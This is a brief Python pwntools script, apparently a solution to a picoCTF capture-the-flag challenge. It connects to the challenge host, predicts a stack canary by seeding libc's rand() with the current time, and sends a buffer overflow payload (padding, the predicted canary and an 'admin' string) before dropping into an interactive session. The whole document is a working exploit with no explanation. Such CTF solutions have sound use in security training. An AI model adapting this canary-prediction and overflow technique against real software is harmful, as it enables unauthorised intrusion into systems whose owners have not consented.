from pwn import *
from ctypes import CDLL

libc = CDLL('libc.so.6')
libc.srand(libc.time(None))
canary = libc.rand()

HOST, PORT = '0.0.0.0', 31337
HOST, PORT = 'wily-courier.picoctf.net', 61463
r = remote(HOST, PORT)

r.send('1\nA\nn\n0\n1\nn\n')
r.send('1\nB\nn\n0\n1\nn\n')

r.send('2\n0\n')

r.send(b'1\nA\nn\n0\n' + b'A' * 28 + p32(canary) + p32(0x35) + p32(0x35) + b'admin' + b'\nn\n')

r.send(b'4\n1\n')

r.interactive()